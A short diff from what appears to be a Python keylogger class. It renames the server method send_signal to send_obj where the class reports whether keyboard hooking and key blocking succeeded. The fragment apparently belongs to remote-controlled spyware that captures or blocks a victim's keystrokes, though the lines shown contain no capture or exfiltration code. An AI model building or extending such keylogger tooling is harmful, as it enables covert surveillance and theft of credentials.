@@ -29,10 +29,10 @@ class KeyLogger:
             pass
 
         if self.hooker.is_hooked:
-            self.server.send_signal("Success")
+            self.server.send_obj("Success")
 
         else:
-            self.server.send_signal("Failed")
+            self.server.send_obj("Failed")
 
     def unhook_keys(self):
         self.hooker.stop()
@@ -45,9 +45,9 @@ class KeyLogger:
         ok = self.hooker.block()
 
         if ok:
-            self.server.send_signal("Success")
+            self.server.send_obj("Success")
         else:
-            self.server.send_signal("Failed")
+            self.server.send_obj("Failed")
 
     def unblock_keys(self):
         self.hooker.unblock()
